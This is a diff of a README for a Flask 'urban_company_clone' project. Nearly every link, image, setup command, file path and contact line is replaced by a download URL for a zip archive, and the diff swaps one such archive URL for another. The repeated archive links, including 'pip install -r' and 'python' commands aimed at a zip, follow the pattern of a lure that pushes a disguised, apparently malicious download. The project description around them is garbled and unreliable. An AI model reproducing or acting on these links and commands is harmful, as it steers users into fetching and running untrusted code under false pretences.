@@ -19,8 +19,8 @@ Welcome to the **urban_company_clone** repository, where you can find a full-sta
   - sqlite3
 
 ## 📦 Download
-You can download the latest version of the project [here](https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip).
-![Download](https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip)
+You can download the latest version of the project [here](https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip).
+![Download](https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip)
 
 ## Features
 - 🎨 Responsive design with Bootstrap 5 and CSS.
@@ -33,21 +33,21 @@ You can download the latest version of the project [here](https://github.com/tek
 ## Setup Instructions
 To run this project locally, follow these steps:
 1. Clone the repository to your local machine.
-2. Install the required dependencies using `pip install -r https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip`.
-3. Run the Flask application using `python https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip`.
+2. Install the required dependencies using `pip install -r https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip`.
+3. Run the Flask application using `python https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip`.
 4. Access the web application in your browser at `http://localhost:5000`.
 
 ## Project Structure
 The project structure is organized as follows:
-- `https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip`: Main Flask application file.
+- `https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip`: Main Flask application file.
 - `templates/`: Contains HTML templates.
 - `static/`: Includes CSS files and other static assets.
-- `https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip`: Defines database models using SQLAlchemy.
-- `https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip`: Implements RESTful APIs for the project.
+- `https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip`: Defines database models using SQLAlchemy.
+- `https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip`: Implements RESTful APIs for the project.
 
 ## Screenshots
-![Screenshot 1](https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip)
-![Screenshot 2](https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip)
+![Screenshot 1](https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip)
+![Screenshot 2](https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip)
 
 ## Roadmap
 Future updates and enhancements planned for the project include:
@@ -63,7 +63,7 @@ Contributions to the project are welcome! If you have any ideas, enhancements, o
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Contact
-For any inquiries or feedback, you can reach out to the project maintainer at https://github.com/tekin441/urban_company_clone/releases/download/v2.0/Software.zip
+For any inquiries or feedback, you can reach out to the project maintainer at https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip
 
 ---
 
